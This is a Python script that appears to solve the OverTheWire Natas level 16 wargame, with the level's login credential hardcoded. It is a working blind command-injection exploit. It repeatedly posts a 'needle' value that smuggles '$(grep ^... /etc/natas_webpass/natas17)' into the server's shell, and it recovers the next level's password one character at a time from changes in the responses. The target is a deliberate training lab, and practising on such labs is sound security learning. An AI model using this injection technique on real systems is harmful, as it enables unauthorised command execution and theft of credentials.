
import requests
import time
from string import ascii_lowercase, ascii_uppercase, digits

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()

seen_password = []

while len(seen_password) < 32:
    found = False
    for character in characters:
        attempt = ''.join(seen_password) + character
        payload = f'anythings$(grep ^{attempt} /etc/natas_webpass/natas17)'
        try:
            response = session.post(
                url,
                data={'needle': payload},
                auth=(username, password),
                timeout=10
            )
            content = response.text
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            time.sleep(1)
            continue
        if 'anythings' not in content:
            # grep matched → no change → correct char
            seen_password.append(character)
            print(f"[+] Found so far: {''.join(seen_password)}")
            found = True
            break
        time.sleep(0.1)

    if not found:
        print("[-] No matching character found. This shouldn't happen!")
        break
print(f"[✓] Final password: {''.join(seen_password)}")